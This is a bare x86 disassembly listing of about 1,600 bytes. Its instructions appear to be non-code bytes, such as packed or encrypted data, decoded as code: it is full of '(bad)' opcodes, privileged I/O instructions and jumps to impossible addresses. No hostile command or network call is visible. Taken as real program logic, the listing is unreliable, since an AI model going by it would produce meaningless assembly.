  423ff5:	mov    eax,ds:0x1e49388f
  423ffa:	in     eax,dx
  423ffb:	mov    sp,0x55c9
  423fff:	ja     0x423fa4
  424001:	sub    eax,0x689f65e
  424006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424007:	rol    BYTE PTR [edx+0x62835f8a],1
  42400d:	in     al,dx
  42400e:	adc    edx,esi
  424010:	pop    es
  424011:	pop    ebx
  424012:	mov    bl,0xbe
  424014:	jmp    0x44884ce1
  424019:	dec    esi
  42401a:	sbb    BYTE PTR [edi],cl
  42401c:	dec    esp
  42401d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42401e:	clc    
  42401f:	sub    ecx,DWORD PTR [esi]
  424021:	add    al,0xea
  424023:	cmp    BYTE PTR [esi+eax*1-0x46],0x9d
  424028:	mov    esi,DWORD PTR [edi]
  42402a:	fcomp  DWORD PTR [ecx]
  42402c:	arpl   WORD PTR [eax-0x715c6050],ax
  424032:	ins    BYTE PTR es:[edi],dx
  424033:	push   esi
  424034:	aad    0xd
  424036:	cmp    eax,0x70014ff1
  42403b:	xor    bh,BYTE PTR [ebp+0x1ea561c9]
  424041:	push   0xffffffdc
  424043:	sub    esp,eax
  424045:	sub    esi,DWORD PTR [ebp+0x7a262b3c]
  42404b:	inc    ecx
  42404c:	lods   al,BYTE PTR ds:[esi]
  42404d:	inc    eax
  42404e:	mov    bh,0xe0
  424050:	jae    0x4240ba
  424052:	pushf  
  424053:	jb     0x4240a1
  424055:	fmul   DWORD PTR [eax]
  424057:	repz mov bl,0x0
  42405a:	dec    esp
  42405b:	adc    eax,0x5b610a04
  424060:	ror    BYTE PTR [edi-0x1542fe97],cl
  424066:	xchg   esp,eax
  424067:	ror    DWORD PTR [esi+eiz*1-0x20d00f85],cl
  42406e:	cdq    
  42406f:	jo     0x424048
  424071:	push   0x28
  424073:	mov    dh,0xce
  424075:	sub    edi,eax
  424077:	mov    al,ds:0xd5424e52
  42407c:	pusha  
  42407d:	mov    DWORD PTR [edi-0x7358f406],ecx
  424083:	std    
  424084:	sub    esi,ebp
  424086:	cld    
  424087:	daa    
  424088:	dec    ebx
  424089:	jp     0x42400e
  42408b:	or     al,0xe3
  42408d:	lds    ecx,FWORD PTR [ebp-0x7c]
  424090:	or     eax,0x6ea403a2
  424095:	or     ecx,DWORD PTR [ebx-0x80]
  424098:	add    ebp,ebp
  42409a:	add    bh,BYTE PTR [ecx+0x66]
  42409d:	mov    cl,0x43
  42409f:	push   cs
  4240a0:	cmc    
  4240a1:	dec    esp
  4240a2:	push   ecx
  4240a3:	inc    esi
  4240a4:	pop    ss
  4240a5:	jae    0x42409c
  4240a7:	pop    es
  4240a8:	ror    DWORD PTR [ecx],cl
  4240aa:	loop   0x4240a6
  4240ac:	mov    ?,WORD PTR [edx]
  4240ae:	and    esp,edx
  4240b0:	mov    esp,DWORD PTR [esi-0x3f]
  4240b3:	das    
  4240b4:	je     0x42410a
  4240b6:	mov    eax,ds:0xe43ec091
  4240bb:	inc    DWORD PTR [edi-0x5]
  4240be:	arpl   sp,bx
  4240c0:	lock and BYTE PTR [edi-0x5691dbac],0xd6
  4240c8:	ss inc edx
  4240ca:	pop    eax
  4240cb:	mov    eax,ds:0xd490c1b0
  4240d0:	imul   ebp,DWORD PTR fs:[ecx-0x3aa72b87],0xb18cb25e
  4240db:	cmp    ah,BYTE PTR [edx-0x4a]
  4240de:	xchg   BYTE PTR [esi+eax*4-0x29],al
  4240e2:	dec    ebp
  4240e3:	cmp    DWORD PTR [ecx+0xc],esp
  4240e6:	or     BYTE PTR [edi],0xba
  4240e9:	sub    DWORD PTR [edi+0x7a96d24b],edi
  4240ef:	gs inc esi
  4240f1:	imul   ecx,DWORD PTR ds:0x4f8940d3,0xe8c55d74
  4240fb:	mov    ds:0x44dd416d,eax
  424100:	sub    DWORD PTR [edx-0x57],edx
  424103:	cdq    
  424104:	test   eax,0xe347becb
  424109:	test   BYTE PTR [edi],ch
  42410b:	sar    BYTE PTR [ebp-0x2666b19e],1
  424111:	cmp    DWORD PTR [ecx+0x7bf231cb],edi
  424117:	int    0xe4
  424119:	cli    
  42411a:	into   
  42411b:	xchg   ebx,eax
  42411c:	inc    edi
  42411d:	stc    
  42411e:	fcomp  st(6)
  424120:	and    edx,DWORD PTR [ebp-0x22f5af1b]
  424126:	sbb    ebx,edi
  424128:	ror    al,1
  42412a:	sar    ebp,cl
  42412c:	loope  0x42411e
  42412e:	fcomp  DWORD PTR [edx]
  424130:	or     cl,BYTE PTR [ebp-0x40]
  424133:	and    ebp,edi
  424135:	mov    WORD PTR [edx+0x6],cs
  424138:	dec    ecx
  424139:	push   edx
  42413a:	pop    es
  42413b:	fwait
  42413c:	push   eax
  42413d:	(bad)  
  42413e:	cmp    BYTE PTR [esi],cl
  424140:	cmp    al,0xcb
  424142:	js     0x424180
  424144:	test   al,0x6
  424146:	push   0x3179b776
  42414b:	adc    BYTE PTR [eax+0x3b],cl
  42414e:	cmc    
  42414f:	jecxz  0x4241a3
  424151:	mov    WORD PTR [esi-0x21e5d846],ds
  424157:	push   ebx
  424158:	int3   
  424159:	fsub   DWORD PTR [esi]
  42415b:	mov    ecx,0x974c577f
  424160:	sub    ebp,DWORD PTR [eax]
  424162:	and    al,cl
  424164:	jp     0x4241be
  424166:	inc    esi
  424167:	mov    ebx,0x3c93dd2
  42416c:	dec    ebp
  42416d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42416e:	adc    DWORD PTR [ebx],ecx
  424170:	repnz sbb esi,edi
  424173:	in     eax,0x7f
  424175:	ds xor eax,0x66fe2a91
  42417b:	out    0xfe,eax
  42417d:	sub    DWORD PTR [edi-0x7],edx
  424180:	ins    DWORD PTR es:[edi],dx
  424181:	idiv   DWORD PTR [edx]
  424183:	jo     0x4241d0
  424185:	dec    eax
  424186:	mov    WORD PTR [eax],ds
  424188:	sbb    eax,0x29ea4083
  42418d:	sub    ch,ch
  42418f:	repz sbb al,0x8a
  424192:	sbb    bh,cl
  424194:	add    BYTE PTR cs:[eax],al
	...
  4241a7:	add    BYTE PTR [eax],al
  4241a9:	add    BYTE PTR [edx+edx*2+0x57],al
  4241ad:	push   ebp
  4241ae:	push   edi
  4241af:	push   ebp
  4241b0:	inc    esi
  4241b1:	push   ebx
  4241b2:	test   BYTE PTR [eax+0x3d08fe6e],ah
  4241b8:	or     al,0x8a
  4241ba:	xor    al,0xcf
  4241bc:	add    DWORD PTR [eax],eax
  4241be:	rol    DWORD PTR [esi],cl
  4241c0:	add    BYTE PTR [eax],al
  4241c2:	(bad)  
  4241c4:	add    esi,DWORD PTR [esi-0x24]
  4241c7:	out    dx,al
  4241c8:	or     esp,DWORD PTR [di+0x7b05]
  4241cd:	add    DWORD PTR [edx+0x4b],0xfc6c945e
  4241d4:	rcr    BYTE PTR [ebx],1
  4241d6:	neg    BYTE PTR [eax]
  4241d8:	xor    eax,0xfebcd003
  4241dd:	outs   dx,BYTE PTR ds:[esi]
  4241de:	inc    edx
  4241df:	ror    dl,0x11
  4241e2:	ret    0x7fee
  4241e5:	scas   eax,DWORD PTR es:[edi]
  4241e6:	xchg   edx,eax
  4241e7:	les    ebp,FWORD PTR [esi-0x25877bca]
  4241ed:	in     eax,dx
  4241ee:	jmp    0x673990bc
  4241f3:	test   ch,cl
  4241f5:	icebp  
  4241f6:	sub    eax,0xb5e53209
  4241fb:	jl     0x424266
  4241fd:	call   0x870746d0
  424202:	xchg   ebx,eax
  424203:	or     BYTE PTR [edx+ecx*2-0x31],bh
  424207:	sub    eax,0xe113a5ed
  42420c:	ss jmp 0x7ec4:0x735f7f27
  424214:	mov    ds:0xe4508e5a,eax
  424219:	out    0x2e,al
  42421b:	fst    QWORD PTR [ebx-0x3e6118c5]
  424221:	pop    ss
  424222:	hlt    
  424223:	dec    edi
  424224:	enter  0x42f8,0xf8
  424228:	pop    ebp
  424229:	loopne 0x424292
  42422b:	sbb    edx,DWORD PTR [ebp+0xf]
  42422e:	and    ch,al
  424230:	stos   BYTE PTR es:[edi],al
  424231:	jmp    0x424257
  424233:	popa   
  424234:	outs   dx,DWORD PTR fs:[esi]
  424236:	rcl    DWORD PTR [ebx],1
  424238:	sub    eax,0x16c90b8d
  42423d:	or     ebp,DWORD PTR ds:[edx]
  424240:	in     eax,0x2
  424242:	loope  0x424227
  424244:	mov    edi,0x148c41c3
  424249:	outs   dx,BYTE PTR ds:[esi]
  42424a:	push   cs
  42424b:	cwde   
  42424c:	push   es
  42424d:	add    DWORD PTR [edi+0x4b1887a9],edx
  424253:	xor    al,0x94
  424255:	(bad)  
  424256:	xlat   BYTE PTR ds:[ebx]
  424257:	cmp    DWORD PTR [ecx-0x6f8a05a7],esp
  42425d:	sti    
  42425e:	and    eax,0x7d1ac728
  424263:	jmp    0x47b48f08
  424268:	xchg   edx,eax
  42426a:	out    0x8b,al
  42426c:	adc    esp,esp
  42426e:	push   es
  42426f:	and    bl,dh
  424271:	rcl    dl,cl
  424273:	pop    es
  424274:	scas   al,BYTE PTR es:[edi]
  424275:	(bad)  [ecx]
  424277:	adc    eax,DWORD PTR [eax+0x1f9b4f5]
  42427d:	stos   BYTE PTR es:[edi],al
  42427e:	repnz lods eax,DWORD PTR ss:[esi]
  424281:	mov    eax,0x7b818143
  424286:	mov    WORD PTR [esi],ds
  424288:	adc    ebx,ebp
  42428a:	xchg   edi,eax
  42428b:	mov    eax,0x5da385de
  424290:	or     DWORD PTR [esi+0x69837794],esi
  424296:	mov    esi,0x2a43f46c
  42429b:	imul   esp,eax,0xde36fc04
  4242a1:	xor    eax,0x41d72b8
  4242a6:	fst    st(2)
  4242a8:	stc    
  4242a9:	sub    eax,0x232ee736
  4242ae:	lea    eax,[ebx-0x39dd4521]
  4242b4:	xor    al,0xad
  4242b6:	les    esi,FWORD PTR [ebp-0x22]
  4242b9:	xor    eax,0xb020f09c
  4242be:	loopne 0x424255
  4242c0:	sub    al,0x2c
  4242c2:	mov    al,ds:0x213b56c8
  4242c7:	mov    ds:0x11fc012c,eax
  4242cc:	inc    DWORD PTR [esi+0x33]
  4242cf:	not    DWORD PTR [ebx+0x16ff3026]
  4242d5:	bound  edx,QWORD PTR [esi]
  4242d7:	dec    esp
  4242d8:	and    ah,0xa3
  4242db:	cld    
  4242dc:	mov    ecx,0xb8e34095
  4242e1:	fsub   st,st(3)
  4242e3:	mov    BYTE PTR [ecx-0x1619ae6a],ch
  4242e9:	jmp    0x42431a
  4242eb:	jbe    0x424353
  4242ed:	ja     0x4242e4
  4242ef:	sar    DWORD PTR [edx],cl
  4242f1:	out    0xc5,al
  4242f3:	adc    ebx,eax
  4242f5:	fistp  DWORD PTR [eax-0x1a]
  4242f8:	pop    ebp
  4242f9:	jg     0x424357
  4242fb:	pop    ebx
  4242fc:	xchg   esp,eax
  4242fd:	cld    
  4242fe:	xchg   edi,eax
  4242ff:	pop    esi
  424300:	mov    edi,DWORD PTR [edi+0x228aaedb]
  424306:	xchg   edx,esi
  424308:	test   al,0x4b
  42430a:	(bad)  
  42430b:	in     al,dx
  42430c:	xor    al,BYTE PTR [esi]
  42430e:	loop   0x42430f
  424310:	hlt    
  424311:	iret   
  424312:	test   eax,0x1bc6e58f
  424317:	jecxz  0x424391
  424319:	into   
  42431a:	cmovge edi,DWORD PTR [ebp+0x71fcf0a6]
  424321:	popf   
  424322:	mov    ch,0xee
  424324:	jmp    0xad49:0xbb54
  42432a:	xchg   esi,eax
  42432b:	aam    0xf5
  42432d:	outs   dx,DWORD PTR ds:[esi]
  42432e:	sbb    al,0xf6
  424330:	inc    edi
  424331:	jne    0x424331
  424333:	pop    cx
  424335:	push   ebx
  424336:	sbb    al,BYTE PTR [esi]
  424338:	rcl    DWORD PTR [esi+0x6ee79da3],1
  42433e:	popf   
  42433f:	aaa    
  424340:	dec    edx
  424341:	es pop ss
  424343:	push   cs
  424344:	in     eax,dx
  424345:	push   ebx
  424346:	inc    eax
  424347:	in     eax,0x26
  424349:	(bad)  
  42434a:	push   esp
  42434b:	leave  
  42434c:	adc    BYTE PTR [ebx],ch
  42434e:	out    0x9d,al
  424350:	mov    ?,WORD PTR [esi+0x45]
  424353:	push   0x5eab1853
  424358:	pop    eax
  424359:	dec    ebx
  42435a:	out    0xd6,al
  42435c:	les    ebx,FWORD PTR [eax+0x29]
  42435f:	dec    esi
  424360:	sub    dl,BYTE PTR [ebp+eiz*2+0x59576cec]
  424367:	lods   al,BYTE PTR ds:[esi]
  424368:	xor    dl,BYTE PTR [eax]
  42436a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42436b:	rdpmc  
  42436d:	stc    
  42436e:	pop    ebx
  42436f:	pop    edi
  424370:	cmp    eax,0x9d4e05b
  424375:	daa    
  424376:	pop    ecx
  424377:	addr16 cld 
  424379:	adc    ecx,DWORD PTR [ecx+ebx*8+0x752adcaa]
  424380:	clc    
  424381:	sub    DWORD PTR [ebx],0x2b1c6f12
  424387:	int    0x26
  424389:	push   ebx
  42438a:	outs   dx,DWORD PTR ds:[esi]
  42438b:	xor    eax,0x9d65c128
  424390:	mov    ecx,?
  424392:	inc    ecx
  424393:	(bad)  
  424395:	and    al,0xea
  424397:	mov    esp,0xb4648df9
  42439c:	femms  
  42439e:	stos   BYTE PTR es:[edi],al
  42439f:	xlat   BYTE PTR ds:[ebx]
  4243a0:	xchg   esp,eax
  4243a1:	repnz or al,0xce
  4243a4:	jp     0x4243f5
  4243a6:	cmp    DWORD PTR [edi+0x73],ebp
  4243a9:	dec    edx
  4243aa:	into   
  4243ab:	(bad)  
  4243ac:	adc    bh,BYTE PTR [esi-0x16]
  4243af:	push   ecx
  4243b0:	cmp    BYTE PTR [esi],dl
  4243b2:	push   0x11
  4243b4:	or     ch,BYTE PTR [eax]
  4243b6:	scas   al,BYTE PTR es:[edi]
  4243b7:	adc    al,BYTE PTR [ecx]
  4243b9:	fbld   TBYTE PTR [esi]
  4243bb:	icebp  
  4243bc:	push   es
  4243bd:	lock daa 
  4243bf:	imul   ebp,DWORD PTR [ebx+0x75e68760],0x25
  4243c6:	mov    eax,DWORD PTR [eax+0x21ec1a86]
  4243cc:	xor    cl,BYTE PTR [edx]
  4243ce:	mov    cs,edi
  4243d0:	clc    
  4243d1:	test   eax,0x7ce08cad
  4243d6:	icebp  
  4243d7:	xchg   ebx,eax
  4243d8:	dec    edi
  4243d9:	sbb    cl,BYTE PTR [esi-0x5f]
  4243dc:	scas   al,BYTE PTR es:[edi]
  4243dd:	jns    0x424390
  4243df:	test   BYTE PTR [esi+0x79],0x9e
  4243e3:	sub    eax,DWORD PTR [ecx-0x2]
  4243e6:	sub    DWORD PTR [edx+0x1e08da83],0x32da3fd2
  4243f0:	jmp    0x424467
  4243f2:	add    ch,BYTE PTR [edi+0x4430026d]
  4243f8:	and    eax,0xd2012fef
  4243fd:	ja     0x424414
  4243ff:	js     0x4243e5
  424401:	and    eax,0xc2e13dc3
  424406:	and    ebx,0x75
  424409:	loopne 0x424423
  42440b:	sbb    eax,0x796265c2
  424410:	jecxz  0x424453
  424412:	jno    0x4243d8
  424414:	pop    edx
  424415:	jnp    0x42441f
  424417:	or     ch,BYTE PTR [ebp+0x3a736a24]
  42441d:	add    eax,0xbf710603
  424422:	lods   al,BYTE PTR ds:[esi]
  424423:	pop    ss
  424424:	push   es
  424425:	wbinvd 
  424427:	nop
  424428:	inc    edx
  424429:	lock mov al,ds:0xb4ef46fd
  42442f:	mov    edx,0xf90ab401
  424434:	adc    DWORD PTR [ecx+0x6b],ebp
  424437:	fucomip st,st(5)
  424439:	test   eax,0xbaf69976
  42443e:	xor    eax,0xdfea3605
  424443:	mov    eax,0x4f06b1db
  424448:	or     eax,0xc85b9d8b
  42444d:	mov    fs,eax
  42444f:	xor    BYTE PTR [edx-0x28],cl
  424452:	jo     0x424436
  424454:	lods   al,BYTE PTR ds:[esi]
  424455:	mov    dh,0x8a
  424457:	(bad)  
  424458:	popa   
  424459:	push   0xc513a884
  42445e:	mov    eax,ds:0x2820f9c
  424463:	mov    esi,0x1bb98bcf
  424468:	in     eax,0x4b
  42446a:	in     eax,dx
  42446b:	jg     0x42440c
  42446d:	(bad)  
  42446e:	in     al,dx
  42446f:	push   esp
  424470:	mov    ?,WORD PTR [edi]
  424472:	mov    dl,0xb4
  424474:	cdq    
  424475:	adc    eax,0x7153f8dd
  42447a:	ret    
  42447b:	ins    DWORD PTR es:[edi],dx
  42447c:	pop    ebp
  42447d:	lock ja 0x4244ed
  424480:	xchg   esi,eax
  424481:	push   ecx
  424482:	outs   dx,DWORD PTR ds:[esi]
  424483:	or     bl,ch
  424485:	sub    al,0x64
  424488:	fwait
  424489:	cli    
  42448a:	outs   dx,BYTE PTR ds:[esi]
  42448b:	rcr    ch,0xbc
  42448e:	cmc    
  42448f:	or     al,0x1
  424491:	push   0xe
  424493:	mov    ds:0xec18fe84,al
  424498:	pop    ss
  424499:	ret    
  42449a:	pusha  
  42449b:	clc    
  42449c:	repz test BYTE PTR ds:0x50cf3d0b,dh
  4244a3:	leave  
  4244a4:	xchg   ecx,eax
  4244a5:	int    0xc3
  4244a7:	inc    eax
  4244a8:	popf   
  4244a9:	pop    ecx
  4244aa:	push   es
  4244ab:	xchg   ebx,eax
  4244ac:	call   0xd2698625
  4244b1:	xchg   esp,eax
  4244b2:	dec    esi
  4244b3:	ja     0x424504
  4244b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b6:	jg     0x4244a4
  4244b8:	lods   al,BYTE PTR ds:[esi]
  4244b9:	ror    DWORD PTR [edi],1
  4244bb:	popa   
  4244bc:	xor    al,0x91
  4244be:	dec    eax
  4244bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244c0:	xchg   esi,eax
  4244c1:	int    0xe
  4244c3:	(bad)  
  4244c4:	fcmovbe st,st(0)
  4244c6:	mov    al,ds:0x59617863
  4244cb:	add    al,0xcf
  4244cd:	sbb    eax,0x62bdc639
  4244d2:	cmc    
  4244d3:	pop    ss
  4244d4:	loopne 0x4244e6
  4244d6:	adc    ebx,edx
  4244d8:	mov    ecx,0xe07cefeb
  4244dd:	leave  
  4244de:	sbb    cl,ah
  4244e0:	call   0xd681e66f
  4244e5:	in     eax,0x66
  4244e7:	cmp    edx,DWORD PTR [esi-0x26]
  4244ea:	fstp   TBYTE PTR [edi]
  4244ec:	outs   dx,BYTE PTR ds:[esi]
  4244ed:	jo     0x4244e6
  4244ef:	imul   esp,DWORD PTR [eax+0x23],0xfffffff9
  4244f3:	xchg   esi,eax
  4244f4:	and    ah,dl
  4244f6:	pop    edx
  4244f7:	inc    esp
  4244f8:	aam    0x6e
  4244fa:	out    0xe0,eax
  4244fc:	daa    
  4244fd:	frstor [edi+ebp*2]
  424500:	adc    bh,BYTE PTR [ecx]
  424502:	in     al,dx
  424503:	push   edx
  424504:	(bad)  
  424506:	xlat   BYTE PTR ds:[ebx]
  424507:	or     BYTE PTR [edi],bh
  424509:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42450b:	xchg   ecx,eax
  42450c:	cs xchg edx,eax
  42450e:	test   BYTE PTR [edx],al
  424510:	dec    eax
  424511:	and    ecx,ecx
  424513:	xor    ebx,DWORD PTR [edx]
  424515:	js     0x424522
  424517:	cld    
  424518:	jae    0x424581
  42451a:	push   eax
  42451b:	outs   dx,DWORD PTR ds:[esi]
  42451c:	mov    al,0xd5
  42451e:	xor    DWORD PTR [eax-0x51b56286],ebx
  424524:	ins    BYTE PTR es:[edi],dx
  424525:	fdivr  QWORD PTR [esi-0x4f]
  424528:	mov    ah,0xe7
  42452a:	repz (bad) 
  42452c:	aas    
  42452d:	sbb    ebp,DWORD PTR [ebp+0x69064888]
  424533:	xchg   esi,eax
  424534:	push   esi
  424535:	stc    
  424536:	test   DWORD PTR [ecx],ecx
  424538:	push   esp
  424539:	jae    0x424580
  42453b:	mov    dl,0x65
  42453d:	xlat   BYTE PTR ds:[ebx]
  42453e:	ins    BYTE PTR es:[edi],dx
  42453f:	jno    0x42458e
  424541:	mov    al,0x6
  424543:	pop    ebx
  424544:	hlt    
  424545:	imul   edx,edi,0xfffffff2
  424548:	xor    BYTE PTR [esi-0x49],ch
  42454b:	adc    dh,dl
  42454d:	push   es
  42454e:	xchg   BYTE PTR [esp+edi*8],bl
  424551:	lods   al,BYTE PTR ds:[esi]
  424552:	push   eax
  424553:	pop    ss
  424554:	jae    0x424547
  424556:	push   ebx
  424557:	xchg   esp,ebp
  424559:	lds    edi,FWORD PTR [edi+0x7b5e0581]
  42455f:	adc    cl,0xfe
  424562:	mov    ebx,edx
  424564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424565:	scas   eax,DWORD PTR es:[edi]
  424566:	mov    edx,0x140ad3b
  42456b:	jecxz  0x42457a
  42456d:	inc    esp
  42456e:	loop   0x42451a
  424570:	adc    eax,0xa4bb03ca
  424575:	pop    edi
  424576:	mov    edi,0x4b8a6fb7
  42457b:	adc    BYTE PTR [ebx],ch
  42457d:	mov    bl,0xe6
  42457f:	adc    BYTE PTR [edx],cl
  424581:	push   esi
  424582:	mov    WORD PTR [edx-0xa],gs
  424585:	cmp    dh,ch
  424587:	mov    dl,0xe4
  424589:	adc    ebp,DWORD PTR [ebx]
  42458b:	or     bh,dh
  42458d:	jnp    0x4245ba
  42458f:	cmp    BYTE PTR [eax+0x6d],al
  424592:	dec    DWORD PTR [edx-0x7841fa22]
  424598:	(bad)  
  424599:	(bad)  
  42459a:	lods   eax,DWORD PTR ds:[esi]
  42459b:	or     eax,0x46587f63
  4245a0:	pop    es
  4245a1:	pop    ss
  4245a2:	sbb    BYTE PTR ds:0xdb0b9e21,al
  4245a8:	push   esp
  4245a9:	add    eax,0xb69fd87b
  4245ae:	loope  0x424562
  4245b0:	cwde   
  4245b1:	xchg   ecx,eax
  4245b2:	push   esp
  4245b3:	imul   eax,esp,0x8ac90100
  4245b9:	push   ecx
  4245ba:	pop    es
  4245bb:	add    cl,0x69
  4245be:	and    eax,ecx
  4245c0:	scas   eax,DWORD PTR es:[edi]
  4245c1:	inc    eax
  4245c2:	xchg   DWORD PTR [ecx+0x2c4dd9fb],edi
  4245c8:	das    
  4245c9:	push   esp
  4245ca:	into   
  4245cb:	ins    BYTE PTR es:[edi],dx
  4245cc:	cmp    BYTE PTR ds:0x665d3826,0xc7
  4245d3:	xor    al,0x59
  4245d5:	xchg   ebp,eax
  4245d6:	ror    BYTE PTR [edx],cl
  4245d8:	add    BYTE PTR [edi-0x1edb887f],ah
  4245de:	pop    edi
  4245df:	call   edi
  4245e1:	rcl    DWORD PTR [edi+edx*2+0x363a1c23],0x1
  4245e9:	fwait
  4245ea:	clc    
  4245eb:	mov    WORD PTR [ebx-0x6f3c8d5d],ds
  4245f1:	fmul   QWORD PTR [edx-0xd086ad5]
  4245f7:	imul   esp,DWORD PTR [ecx],0x2e55db9c
  4245fd:	inc    esp
  4245fe:	mov    edi,0x1e65e94f
  424603:	mov    BYTE PTR [edi-0x17],0x93
  424607:	push   ecx
  424608:	shl    DWORD PTR [esi+0x6f],0xd3
  42460c:	mov    WORD PTR [ecx*8+0x7341a1d1],ss
  424613:	sbb    al,0x66
  424615:	jnp    0x424634
  424617:	out    0x9e,eax
  424619:	ins    DWORD PTR es:[edi],dx
  42461a:	sbb    al,0x61
  42461c:	jecxz  0x42468a
  42461e:	adc    eax,0x4f6a4101
  424623:	push   ebx
  424624:	or     BYTE PTR [ecx-0x1d51ff93],0xe8
  42462b:	aam    0xbe
  42462d:	add    BYTE PTR ds:0x518d215b,bh
  424633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424634:	and    al,0x45
  424636:	dec    edx
  424637:	sbb    dh,ch
  424639:	inc    esi
  42463a:	dec    edi
  42463b:	jb     0x4246b7
  42463d:	xor    ebp,0xffffffb2
  424640:	mov    eax,ds:0x2d548892
  424645:	add    BYTE PTR [edx-0x6e],al
  424648:	pop    ss
  424649:	sub    BYTE PTR [eax-0x7fdf9076],0xf8
  424650:	fidivr DWORD PTR [esi+eax*2]
  424653:	or     eax,0x23012b87
  424658:	push   ebp
  424659:	rol    BYTE PTR [esi],1
  42465b:	in     al,0x80
  42465d:	pop    edx
  42465e:	sub    BYTE PTR [ecx],ch
  424660:	aad    0x2e
  424662:	daa    
  424663:	dec    DWORD PTR [esi+0x118c60a2]
  424669:	or     al,0xda
  42466b:	or     BYTE PTR [ebx-0x52cfaaf0],ah
  424671:	pop    ebp
  424672:	test   DWORD PTR [edi-0x4d],edx
  424675:	mov    ecx,0xe014f441
  42467a:	mov    WORD PTR [ecx],?
  42467c:	test   eax,0xed03e1e8
  424681:	(bad)  
  424683:	pusha  
  424684:	test   edi,ebx
  424686:	xor    bh,BYTE PTR [esi*8-0x724a8f6f]
  42468d:	jge    0x4246f9
  42468f:	push   0x6b2e1de9
  424694:	xchg   esp,eax
  424695:	rcr    BYTE PTR [esi+0x8],cl
  424698:	in     al,dx
  424699:	and    edx,edx
  42469b:	test   eax,0xf6d59b1c
  4246a0:	xchg   esp,eax
  4246a1:	xchg   BYTE PTR [edx-0xd4173c1],ch
  4246a7:	push   ebx
  4246a8:	into   
  4246a9:	pop    ecx
  4246aa:	aad    0x47
  4246ac:	es ret 0x72bf
  4246b0:	mov    esi,0x92529473
  4246b5:	push   edx
  4246b6:	mov    ch,BYTE PTR [eax-0x578e84f6]
  4246bc:	mov    ss:0xf7ce0e1d,al
  4246c2:	test   BYTE PTR [edx],ch
  4246c4:	jge    0x424735
  4246c6:	push   es
  4246c7:	adc    dh,BYTE PTR [ebx-0x7d]
  4246ca:	fild   WORD PTR [ecx+0x33]
  4246cd:	mov    eax,0xca623f1c
  4246d2:	repz and DWORD PTR ds:0xe8f906b6,eax
  4246d9:	cs pop edx
  4246db:	popa   
  4246dc:	les    edx,FWORD PTR [ebp-0x7e44ac84]
  4246e2:	rcl    BYTE PTR [edi-0x1a],1
  4246e5:	push   0xe62c7ee
  4246ea:	jl     0x424693
  4246ec:	mov    ch,0xed
  4246ee:	mov    al,ds:0xb9c4b386
  4246f3:	pop    ds
  4246f4:	mov    edx,0x5ca4dc7
  4246f9:	sub    BYTE PTR [ebx-0x80],0x21
  4246fd:	sahf   
  4246fe:	sub    edx,DWORD PTR [esi]
  424700:	inc    esp
  424701:	dec    ebp
  424702:	push   cs
  424703:	jp     0x4246ad
  424705:	jmp    0x42470b
  424707:	mov    al,ds:0xe3f95b67
  42470c:	add    eax,DWORD PTR [esi]
  42470e:	mov    al,0x89
  424710:	call   0xb408:0x9a57b370
  424717:	sar    BYTE PTR [edi],cl
  424719:	adc    BYTE PTR [edx+esi*8-0xb1ee952],cl
  424720:	or     DWORD PTR [ebp-0x49],edi
  424723:	cmp    edi,DWORD PTR [ebp-0x20]
  424726:	jg     0x42475f
  424728:	and    eax,0xc837fbc5
  42472d:	push   cs
  42472e:	add    BYTE PTR [edi-0x3d],0x7b
  424732:	sub    cl,BYTE PTR [ebx+0x34685533]
  424738:	lahf   
  424739:	rcl    eax,1
  42473b:	push   ebx
  42473c:	sbb    ch,BYTE PTR [edx]
  42473e:	push   ebx
  42473f:	pop    ss
  424740:	jmp    0x44ae:0xf0de55fe
  424747:	cmp    BYTE PTR [ebx],ch
  424749:	popa   
  42474a:	jno    0x4247ad
  42474c:	push   0x12
  42474e:	xchg   esp,eax
  42474f:	or     al,0x4a
  424751:	add    BYTE PTR [edx+0x7cb6eb21],ch
  424757:	aas    
  424758:	dec    ecx
  424759:	adc    eax,0xcd17ed6a
  42475e:	jle    0x424751
  424760:	cmp    al,0x55
  424762:	lods   al,BYTE PTR ds:[esi]
  424763:	stos   BYTE PTR es:[edi],al
  424764:	mov    ds:0x5049da78,eax
  424769:	xor    eax,ecx
  42476b:	mov    al,0xd
  42476d:	cmc    
  42476e:	jae    0x4247d8
  424770:	jne    0x4247bd
  424772:	inc    ebx
  424773:	push   esi
  424774:	mov    eax,ds:0x2e6eb441
  424779:	dec    ebx
  42477a:	es js  0x42476d
  42477d:	fisubr WORD PTR [edx-0x5]
  424780:	inc    esp
  424781:	adc    DWORD PTR [eax],edx
  424783:	or     edx,eax
  424785:	imul   ebp,edi,0x53
  424788:	xlat   BYTE PTR cs:[ebx]
  42478a:	mov    esp,0x565be90f
  42478f:	mov    ?,eax
  424791:	fwait
  424792:	mov    al,0xf2
  424794:	sbb    eax,0xf23b8226
  424799:	(bad)  
  42479a:	mov    cl,0x11
  42479c:	out    0x44,al
  42479e:	sbb    eax,0x2e2711ae
  4247a3:	js     0x424804
  4247a5:	mov    ch,ch
  4247a7:	aam    0x7f
  4247a9:	jge    0x424809
  4247ab:	cmp    dh,bl
  4247ad:	dec    edx
  4247ae:	leave  
  4247af:	xchg   edi,eax
  4247b0:	pop    edx
  4247b1:	cmp    DWORD PTR [esp+ebp*1-0x38],esi
  4247b5:	sub    al,0x6b
  4247b7:	(bad)  
  4247b8:	dec    ebp
  4247b9:	sahf   
  4247ba:	cmp    al,0x72
  4247bc:	ins    BYTE PTR es:[edi],dx
  4247bd:	push   ecx
  4247be:	push   ds
  4247bf:	sub    eax,0x63c9fabb
  4247c4:	adc    ah,BYTE PTR [ebp-0x61]
  4247c7:	mov    DWORD PTR [esi],esp
  4247c9:	xchg   BYTE PTR [eax-0x38011832],dl
  4247cf:	mov    DWORD PTR [ecx-0xd],ebp
  4247d2:	adc    eax,0xc251c863
  4247d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247d8:	int    0x3a
  4247da:	scas   al,BYTE PTR es:[edi]
  4247db:	jl     0x4247f7
  4247dd:	cmp    BYTE PTR [edi-0x552ad4b1],ah
